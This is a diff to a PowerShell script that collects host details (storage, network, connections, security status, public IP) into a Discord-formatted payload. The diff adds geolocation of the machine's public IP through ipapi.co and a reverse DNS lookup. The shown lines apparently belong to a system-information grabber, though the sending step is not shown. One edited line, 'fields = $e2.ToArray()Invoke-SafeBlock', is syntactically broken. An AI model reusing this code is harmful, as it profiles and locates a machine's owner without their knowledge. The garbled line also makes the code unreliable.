@@ -348,7 +348,7 @@ function Build-DiscordPayload {
             @{
                 title  = "Storage, Network & Connections"
                 color  = 3066993
-                fields = $e2.ToArray()
+                fields = $e2.ToArray()Invoke-SafeBlock
             },
             @{
                 title  = "Security & Summary"
@@ -841,6 +841,34 @@ Invoke-SafeBlock {
     } catch {}
     Add-Line "PublicIP" $publicIp
     Set-JsonSection "Internet" ([ordered]@{ PublicIP = $publicIp })
+}
+
+if ($publicIp -ne "Unavailable") {
+    Add-Section "GEOLOCATION"
+    $geoInfo = $null
+    try {
+        $geoInfo = Invoke-RestMethod -Uri "https://ipapi.co/$publicIp/json/" -TimeoutSec 10
+    } catch {}
+    if ($geoInfo) {
+        Add-Line "Country" $geoInfo.country_name
+        Add-Line "Region" $geoInfo.region
+        Add-Line "City" $geoInfo.city
+        Set-JsonSection "Geolocation" ([ordered]@{
+            Country = $geoInfo.country_name
+            Region  = $geoInfo.region
+            City    = $geoInfo.city
+        })
+    }
+}
+
+if ($publicIp -ne "Unavailable") {
+    Add-Section "REVERSE DNS"
+    $reverseDns = "Unavailable"
+    try {
+        $reverseDns = [System.Net.Dns]::GetHostEntry($publicIp).HostName
+    } catch {}
+    Add-Line "ReverseDNS" $reverseDns
+    Set-JsonSection "ReverseDNS" ([ordered]@{ HostName = $reverseDns })
 }
 
 $jsonData["OutputFiles"] = [ordered]@{
